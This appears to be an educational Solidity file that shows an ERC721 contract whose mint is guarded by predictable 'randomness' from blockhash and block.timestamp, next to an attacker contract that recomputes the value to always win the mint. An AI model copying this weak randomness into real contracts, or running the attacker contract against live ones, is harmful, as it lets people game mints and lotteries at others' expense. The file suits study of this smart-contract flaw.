// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract BadRandom is ERC721 {
    uint256 public totalSup;

    constructor() ERC721("", "") {}

    function badMint(uint256 inputNum) external {
        uint256 luckNum = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        ) % 100;

        require(inputNum == luckNum, "error-must equal");

        _mint(msg.sender, totalSup);
        totalSup++;
    }

    function getbadMintSelect() external pure returns (bytes4 mSelector) {
        return bytes4(keccak256("mint(uint256)"));
    }

    function sort(uint256[] memory num) public pure returns (uint256[] memory) {
        for (uint256 i = 0; i < num.length; i++) {
            uint256 minNumPosi = i;
            for (uint256 j = i; j < num.length; j++) {
                if (num[j] < num[minNumPosi]) {
                    minNumPosi = j;
                }
            }
            uint256 temp = num[i];
            num[i] = num[minNumPosi];
            num[minNumPosi] = temp;
        }
        return num;
    }
}

contract AttacBadRandom {
    function attacBadMint(BadRandom mintAddr) external {
        uint256 luckNum = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        ) % 100;
        mintAddr.badMint(luckNum);
    }
}
